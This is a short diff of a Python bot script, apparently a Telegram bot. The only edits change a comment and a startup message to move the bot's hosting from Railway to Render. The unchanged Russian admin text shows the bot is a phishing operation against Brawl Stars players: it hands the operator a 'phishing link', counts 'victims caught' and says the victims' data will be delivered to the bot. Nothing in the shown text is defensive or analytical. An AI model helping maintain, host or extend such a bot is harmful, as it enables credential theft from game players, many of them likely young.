@@ -14,7 +14,7 @@ user_language = {}
 tickets = {}
 admin_reply_context = {}
 
-# ========== ТЕКСТЫ ==========
+# ========== ТЕКСТЫ (Без изменений) ==========
 TEXTS = {
     'ru': {
         'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.",
@@ -182,7 +182,7 @@ def close_ticket(user_id):
 def get_active_ticket(user_id):
     return tickets.get(user_id) if tickets.get(user_id, {}).get("active") else None
 
-print("✅ Бот запущен на Railway!")
+print("✅ Бот запущен на Render!")
 
 while True:
     try:
@@ -306,4 +306,4 @@ while True:
 
     except Exception as e:
         print(f"Ошибка: {e}")
-        time.sleep(5) 
+        time.sleep(5)
